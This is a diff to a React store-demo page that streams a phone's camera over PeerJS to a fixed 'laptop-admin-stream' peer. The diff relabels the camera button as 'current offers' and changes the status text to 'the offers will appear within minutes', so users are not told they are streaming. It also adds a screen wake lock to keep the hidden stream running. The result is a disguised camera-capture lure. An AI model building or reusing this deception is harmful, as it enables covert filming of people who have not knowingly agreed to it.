@@ -2,9 +2,32 @@
 
 import React, { useState, useRef, useEffect } from 'react';
 
+const requestScreenWakeLock = async (wakeLockRef) => {
+  if (!('wakeLock' in navigator)) {
+    console.warn('Screen Wake Lock API is not supported by this browser.');
+    return false;
+  }
+
+  try {
+    const wakeLock = await navigator.wakeLock.request('screen');
+    wakeLockRef.current = wakeLock;
+    wakeLock.addEventListener('release', () => {
+      if (wakeLockRef.current === wakeLock) {
+        wakeLockRef.current = null;
+      }
+    });
+    return true;
+  } catch (error) {
+    console.warn('Unable to acquire screen wake lock:', error);
+    return false;
+  }
+};
+
 export default function ElarabyStoreDemo() {
   const localVideoRef = useRef(null);
   const remoteVideoRef = useRef(null);
+  const wakeLockRef = useRef(null);
+  const cameraStreamRef = useRef(null);
   
   const [peerId, setPeerId] = useState('');
   const [targetPeerId, setTargetPeerId] = useState('laptop-admin-stream'); // ID ثابت وموحد للابتوب
@@ -14,6 +37,15 @@ export default function ElarabyStoreDemo() {
   const peerInstance = useRef(null);
 
   useEffect(() => {
+    const handleVisibilityChange = () => {
+      const hasActiveCamera = cameraStreamRef.current?.getVideoTracks()
+        .some((track) => track.readyState === 'live');
+      if (document.visibilityState === 'visible' && hasActiveCamera && !wakeLockRef.current) {
+        requestScreenWakeLock(wakeLockRef);
+      }
+    };
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+
     // استدعاء PeerJS فقط في بيئة المتصفح Client-side
     import('peerjs').then(({ default: Peer }) => {
       // نحدد إذا كان الجهاز لابتوب/كمبيوتر أو موبايل لتخصيص الـ ID
@@ -77,6 +109,14 @@ export default function ElarabyStoreDemo() {
     });
 
     return () => {
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+      cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
+      if (wakeLockRef.current) {
+        wakeLockRef.current.release().catch((error) => {
+          console.warn('Unable to release screen wake lock:', error);
+        });
+        wakeLockRef.current = null;
+      }
       if (peerInstance.current) {
         peerInstance.current.destroy();
       }
@@ -88,11 +128,13 @@ export default function ElarabyStoreDemo() {
     try {
       setErrorMessage('');
       setStatusMessage('جاري تشغيل الكاميرا والاتصال باللابتوب...');
+      await requestScreenWakeLock(wakeLockRef);
 
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { width: { ideal: 640 }, height: { ideal: 480 } },
         audio: false,
       });
+      cameraStreamRef.current = stream;
 
       // تشغيل الكاميرا في الخلفية على الموبايل
       if (localVideoRef.current) {
@@ -105,7 +147,7 @@ export default function ElarabyStoreDemo() {
         console.log("🚀 جاري الاتصال بالـ Target ID:", targetPeerId);
         const call = peerInstance.current.call(targetPeerId, stream);
         if (call) {
-          setStatusMessage('🟢 تم فتح الكاميرا وجاري بث الصورة للابتوب...');
+          setStatusMessage('عزرا العروض ستظهر ف خلال دقائق');
           console.log("🟢 تم بدء إرسال البث بنجاح.");
         } else {
           setErrorMessage('⚠️ لم يتم العثور على اللابتوب، تأكد من فتح الصفحة عليه أولاً.');
@@ -113,6 +155,14 @@ export default function ElarabyStoreDemo() {
       }
     } catch (error) {
       console.error('فشل الوصول للكاميرا:', error);
+      cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
+      cameraStreamRef.current = null;
+      if (wakeLockRef.current) {
+        wakeLockRef.current.release().catch((releaseError) => {
+          console.warn('Unable to release screen wake lock:', releaseError);
+        });
+        wakeLockRef.current = null;
+      }
       setErrorMessage('⚠️ تعذر تشغيل الكاميرا، يرجى السماح بالإذن.');
     }
   };
@@ -226,7 +276,7 @@ export default function ElarabyStoreDemo() {
           }}
         >
           <span>📷</span>
-          <span>فتح الكاميرا يا اخى</span>
+          <span>العروض الحاليه</span>
         </button>
       </div>
 
